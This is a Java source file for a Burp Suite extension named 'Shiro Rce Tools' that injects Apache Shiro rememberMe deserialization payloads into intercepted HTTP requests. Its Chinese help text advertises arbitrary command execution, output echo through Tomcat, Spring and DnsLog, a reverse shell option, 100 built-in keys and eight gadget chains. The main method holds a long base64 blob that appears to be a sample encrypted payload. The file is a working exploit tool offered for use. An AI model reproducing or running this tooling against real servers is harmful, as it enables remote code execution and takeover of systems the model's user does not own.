package burp;



import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class BurpExtender implements IBurpExtender, IHttpListener, IProxyListener, IContextMenuFactory {

    IBurpExtenderCallbacks callbacks;
    IExtensionHelpers helpers;
    IHttpRequestResponse httpRequestResponse;


    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks=callbacks;
        this.helpers=callbacks.getHelpers();
        callbacks.setExtensionName("Shiro Rce Tools");
        callbacks.registerHttpListener(this);
        callbacks.registerProxyListener(this);
        callbacks.registerContextMenuFactory(this);
        PrintWriter stdout=new PrintWriter(callbacks.getStdout(),true);
        PrintWriter stderr=new PrintWriter(callbacks.getStderr(),true);
        stdout.println(getBanner());
    }



    public String getBanner(){

        return "Shiro Rce Tools v2.0\nBy Ntears、";
    }

    public void processProxyMessage(boolean messageIsRequest, IInterceptedProxyMessage message) {

    }

    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {

    }

    public List<JMenuItem> createMenuItems(final IContextMenuInvocation invocation) {
        List<JMenuItem> menus = new ArrayList<JMenuItem>();
        JMenu shiroMenu = new JMenu("Generate shiro Payload");
        JMenuItem payload = new JMenuItem("Generate shiro Payload");
        JMenuItem help = new JMenuItem("Shiro Payload Help");
        shiroMenu.add(payload);
        shiroMenu.add(help);
        shiroMenu.addSeparator();

        if (invocation.getInvocationContext() != 0) {
            payload.setEnabled(false);
        }

        help.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JOptionPane.showMessageDialog(null, help(), "帮助",
                        JOptionPane.WARNING_MESSAGE);
            }
        });
        payload.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                IHttpRequestResponse httpRequestResponse =invocation.getSelectedMessages()[0];
                GenPayload dialog = null;
                try {
                    dialog = new GenPayload();
                    dialog.pack();
                    dialog.setVisible(true);
                    String rememberMe=dialog.gen();
                    if(GenPayload.bool){
                        httpRequestResponse.setRequest(genPayload(httpRequestResponse,rememberMe));
                    }

                } catch (Exception ex) {
                    ex.printStackTrace();
                }


            }
        });
        menus.add(shiroMenu);
        return menus;
    }

    public String help(){
        StringBuilder sb=new StringBuilder();
        sb.append("集成了四种回显方式，一种反弹 shell方式\n");
        sb.append("HttpRequest回显\n");
        sb.append("Tomcat回显\n");
        sb.append("Spring回显\n");
        sb.append("DnsLog执行命令回显\n");
        sb.append("回显手动加header头cmd\n");
        sb.append("可选择cmd执行任意命令\n");
        sb.append("选择ReverseShell为反弹 shell\n");
        sb.append("原生java反弹shell可支持win\n");
        sb.append("内置100key，8种Gadget可随意切换\n");
        sb.append("CommonsBeanutils2只支持Tomcat、Spring、Http回显！！！\n");
        sb.append("\t\t\t\tBy Ntears、");
        return sb.toString();
    }
    public byte[] genPayload(IHttpRequestResponse httpRequestResponse,Object rememberMe) {
        Map<String,String> map = new HashMap<String,String>();
        map.put("Cookie",";rememberMe="+rememberMe);
        map.put("Cookie1","Cookie rememberMe="+rememberMe);
       // map.put("cmd","cmd: whoami");
        List<String> headers = helpers.analyzeRequest(httpRequestResponse).getHeaders();
        byte[] request = httpRequestResponse.getRequest();
        IRequestInfo requestInfo = helpers.analyzeRequest(request);
        int bodyOffset = requestInfo.getBodyOffset();
        String body = new String(request, bodyOffset, request.length - bodyOffset);
        boolean isExists= false;

        for(int i = 0;i<headers.size();i++){
            if(headers.get(i).startsWith("Cookie")){
                if(headers.get(i).contains("rememberMe")){
                    headers.set(i,headers.get(i).substring(0,headers.get(i).indexOf("rememberMe")-1));
                }
                headers.set(i,headers.get(i)+map.get("Cookie"));
                isExists = true;
            }
        }

        if(!isExists){
            headers.add(map.get("Cookie1"));
            isExists=true;
        }

        return helpers.buildHttpMessage(headers,body.getBytes());
    }

    public static void main(String[] args) {
      String str="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";
      System.out.println(str.length());
        //System.out.println(str.substring(0,str.));
    }
}
